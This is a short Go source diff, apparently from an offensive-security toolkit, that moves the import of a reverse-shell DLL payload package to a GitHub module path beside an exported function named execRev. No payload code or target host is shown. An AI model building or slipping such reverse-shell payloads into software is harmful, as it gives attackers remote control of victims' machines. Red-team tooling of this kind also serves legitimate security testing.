@@ -2,8 +2,9 @@ package main
 
 import "C"
 import (
-	rev_shell "OffensiveGolang/pkg/payloads/rev_shell/rev_shell_dll"
 	"time"
+
+	rev_shell "github.com/MrTuxx/OffensiveGolang/pkg/payloads/rev_shell/rev_shell_dll"
 )
 
 //export execRev
